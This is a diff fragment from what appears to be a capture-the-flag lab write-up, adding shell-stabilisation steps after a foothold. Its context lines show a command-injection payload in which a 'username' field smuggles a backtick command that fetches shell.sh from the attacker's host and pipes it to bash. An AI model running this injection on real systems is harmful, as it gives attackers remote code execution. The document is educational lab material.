@@ -142,6 +142,12 @@ so we run our one liner
  curl "http://10.10.11.224:55555/fourth" --data 'username=;` curl 10.10.14.135/shell.sh | bash` '
 ```
 and immediately we get a shell, first things first we upgrade our shell
+- python3 -c 'import pty; pty.spawn("/bin/bash")'
+- Ctrl^Z to background the shell
+- stty raw -echo ; fg to foreground the shell
+- then press the enter button twice
+- once were back in our shell
+export TERM=xterm
 
 ```console
 ┌──(mofe㉿mofe)-[~]
